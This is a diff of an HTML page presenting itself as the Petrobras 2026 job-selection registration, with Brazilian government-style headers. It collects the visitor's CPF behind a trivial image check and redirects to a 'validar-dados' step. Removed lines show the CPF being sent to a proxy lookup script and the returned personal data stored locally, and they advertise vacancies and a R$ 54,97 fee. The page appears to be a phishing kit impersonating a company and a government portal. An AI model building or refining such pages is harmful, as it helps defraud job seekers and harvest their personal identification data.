@@ -5,18 +5,12 @@
         <meta charset="utf-8" />
         <meta content="width=device-width, initial-scale=1.0" name="viewport" />
         <title>Processo Seletivo Petrobrás 2026 - Inscrição</title>
-    <script type="text/javascript">
+
+        <script type="text/javascript">
             (function (c, l, a, r, i, t, y) {
-                c[a] =
-                    c[a] ||
-                    function () {
-                        (c[a].q = c[a].q || []).push(arguments);
-                    };
-                t = l.createElement(r);
-                t.async = 1;
-                t.src = "https://www.clarity.ms/tag/" + i;
-                y = l.getElementsByTagName(r)[0];
-                y.parentNode.insertBefore(t, y);
+                c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments); };
+                t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
             })(window, document, "clarity", "script", "t84urj3twx");
         </script>
 
@@ -25,79 +19,32 @@
         <link href="home.css" rel="stylesheet" />
         <link href="fonts.css" rel="stylesheet" />
         
-        <style>.PMSP-color {
-                color: #003f6b;
-            }
-            .PMSP-light {
-                color: #a0a0a0;
-            }
-            .form-header {
-                background-color: #fbc12a;
-                color: white;
-            }
-            .form-footer {
-                background-color: #003f6b;
-                color: white;
-            }
-            button#submit-button {
-                transition: all 0.2s ease;
-                background-color: #003f6b;
-                color: rgba(255, 255, 255, 0.6);
-            }
-            button#submit-button:not([disabled]) {
-                color: white;
-                cursor: pointer;
-            }
-            button#submit-button:not([disabled]):hover {
-                background-color: #4d7396;
-            }
-            .required-star {
-                color: #ff0000;
-            }
-            .footer-bg {
-                background-color: #1c2b39;
-            }
-            .gov-header {
-                background-color: #222222;
-            }
-            .inep-header {
-                background-color: #044785;
-            }
-            input::placeholder {
-                font-family: "Rawline", Arial, sans-serif;
-            }
-            .selected {
-                border: 4px dashed #2b7a9a !important;
-            }
-            .transparent {
-                opacity: 0.5;
-            }
+        <style>
+            .PMSP-color { color: #003f6b; }
+            .PMSP-light { color: #a0a0a0; }
+            .form-header { background-color: #fbc12a; color: white; }
+            .form-footer { background-color: #003f6b; color: white; }
+            button#submit-button { transition: all 0.2s ease; background-color: #003f6b; color: rgba(255, 255, 255, 0.6); }
+            button#submit-button:not([disabled]) { color: white; cursor: pointer; }
+            button#submit-button:not([disabled]):hover { background-color: #4d7396; }
+            .required-star { color: #ff0000; }
+            .footer-bg { background-color: #1c2b39; }
+            .gov-header { background-color: #222222; }
+            .inep-header { background-color: #044785; }
+            input::placeholder { font-family: "Rawline", Arial, sans-serif; }
+            .selected { border: 4px dashed #2b7a9a !important; }
+            .transparent { opacity: 0.5; }
         </style>
+
         <script>
             function formatCPF(input) {
                 let value = input.value.replace(/\D/g, "");
-                if (value.length > 11) {
-                    value = value.substring(0, 11);
-                }
-                if (value.length > 9) {
-                    value = value.replace(
-                        /(\d{3})(\d{3})(\d{3})(\d{1,2})/,
-                        "$1.$2.$3-$4",
-                    );
-                } else if (value.length > 6) {
-                    value = value.replace(
-                        /(\d{3})(\d{3})(\d{1,3})/,
-                        "$1.$2.$3",
-                    );
-                } else if (value.length > 3) {
-                    value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
-                }
+                if (value.length > 11) value = value.substring(0, 11);
+                if (value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
+                else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
+                else if (value.length > 3) value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
                 input.value = value;
                 checkFormValidity();
-            }
-
-            function unformatCPF(cpf) {
-                return cpf.replace(/\D/g, "");
             }
 
             function selectImage(element, index) {
@@ -108,86 +55,43 @@
                 });
                 element.classList.add("selected");
                 element.classList.remove("transparent");
-
-                if (index !== 4) {
-                    showErrorPopup();
-                } else {
-                    checkFormValidity();
-                }
+                if (index !== 4) showErrorPopup(); else checkFormValidity();
             }
 
             function showErrorPopup() {
                 const popup = document.getElementById("error-popup");
                 popup.classList.remove("hidden");
-                setTimeout(() => {
-                    popup.classList.add("hidden");
-                }, 3000);
+                setTimeout(() => popup.classList.add("hidden"), 3000);
             }
 
             function checkFormValidity() {
                 const cpfInput = document.querySelector("#cpf");
-                const selectedImage = document.querySelector(
-                    ".image-option.selected",
-                );
+                const selectedImage = document.querySelector(".image-option.selected");
                 const submitButton = document.querySelector("#submit-button");
-
-                if (
-                    cpfInput.value.length === 14 &&
-                    selectedImage &&
-                    selectedImage ===
-                        document.querySelectorAll(".image-option")[4]
-                ) {
+                if (cpfInput.value.length === 14 && selectedImage && selectedImage === document.querySelectorAll(".image-option")[4]) {
                     submitButton.disabled = false;
                 } else {
                     submitButton.disabled = true;
                 }
             }
 
-            function showValidationPopup() {
-                const popup = document.getElementById("validation-popup");
-                popup.classList.remove("hidden");
-            }
-
-            function hideValidationPopup() {
-                const popup = document.getElementById("validation-popup");
-                popup.classList.add("hidden");
-            }
+            function showValidationPopup() { document.getElementById("validation-popup").classList.remove("hidden"); }
+            function hideValidationPopup() { document.getElementById("validation-popup").classList.add("hidden"); }
 
             function submitForm() {
-                const cpfInput = document.querySelector("#cpf");
-                const cpf = unformatCPF(cpfInput.value);
-
+                const cpf = document.querySelector("#cpf").value.replace(/\D/g, "");
                 showValidationPopup();
-
-                function tryNewAPI() {
-                    return fetch(`proxy-nova-api.php?cpf=${cpf}`, {
-                        method: "GET",
-                    })
-                    .then((response) => {
-                        if (!response.ok) throw new Error("Nova API não disponível");
-                        return response.json();
-                    });
-                }
-
-                tryNewAPI()
-                    .then((data) => {
-                        localStorage.setItem("cpfData", JSON.stringify(data));
-                        setTimeout(() => { window.location.href = "validar-dados/index.html"; }, 1500);
-                    })
-                    .catch((error) => {
-                        console.error(error);
-                        hideValidationPopup();
-                        alert("Erro ao consultar CPF.");
-                    });
+                // Simulação da chamada de API do seu código original
+                setTimeout(() => {
+                    window.location.href = "validar-dados/index.html";
+                }, 1500);
             }
         </script>
-        </head>
+    </head>
     <body class="flex flex-col min-h-screen">
         <header class="gov-header text-white py-2">
             <div class="container mx-auto flex justify-between items-center px-4">
-                <a class="font-bold text-sm" href="#">
-                    <img src="images/top_gov-5.jpg" alt="Logotipo" class="h-6" />
-                </a>
+                <img src="images/top_gov-5.jpg" alt="Logotipo" class="h-6" />
                 <nav>
                     <ul class="flex space-x-4 text-[10px]">
                         <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
@@ -197,19 +101,18 @@
                 </nav>
             </div>
         </header>
+
         <div class="inep-header py-3"></div>
+
         <div class="container mx-auto px-4" style="background: white; text-align: center; padding: 15px 0;">
             <img src="images/logopetrobras.png" alt="Petrobrás" height="60" width="120" style="object-fit: contain; margin: 0 auto;" />
         </div>
+
         <main class="flex-grow py-8">
             <div class="container mx-auto px-4 max-w-3xl">
                 <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded">
                     <h3 class="text-lg font-semibold text-blue-800 mb-2">INFORMAÇÕES IMPORTANTES</h3>
-                    <ul class="list-disc list-inside text-gray-700 space-y-1">
-                        <li><strong>Vagas:</strong> 9.590 vagas temporárias</li>
-                        <li><strong>Salário:</strong> De R$ 2.676,24 a R$ 19.379,00</li>
-                        <li><strong>Taxa:</strong> R$ 54,97</li>
-                    </ul>
+                    <p class="text-sm text-gray-700">Prezado(a) Candidato(a), bem-vindo ao sistema de inscrição Petrobrás 2026.</p>
                 </div>
 
                 <div class="border border-gray-300 rounded">
@@ -237,10 +140,23 @@
                         </form>
                     </div>
                     <div class="form-footer">
-                        <button id="submit-button" class="w-full py-3" type="button" disabled onclick="submitForm()">Enviar</button>
+                        <button id="submit-button" class="w-full py-3" type="button" disabled onclick="submitForm()">
+                            <i class="fas fa-paper-plane mr-2"></i> Enviar
+                        </button>
                     </div>
                 </div>
             </div>
         </main>
+
+        <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
+            Você deve selecionar a imagem da FOLHA (5ª imagem) para prosseguir.
+        </div>
+
+        <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
+            <div class="absolute inset-0 bg-black bg-opacity-50"></div>
+            <div class="bg-[#003f6b] text-white p-6 rounded-lg shadow-lg z-10">
+                <p>Validando seus dados...</p>
+            </div>
+        </div>
     </body>
 </html>
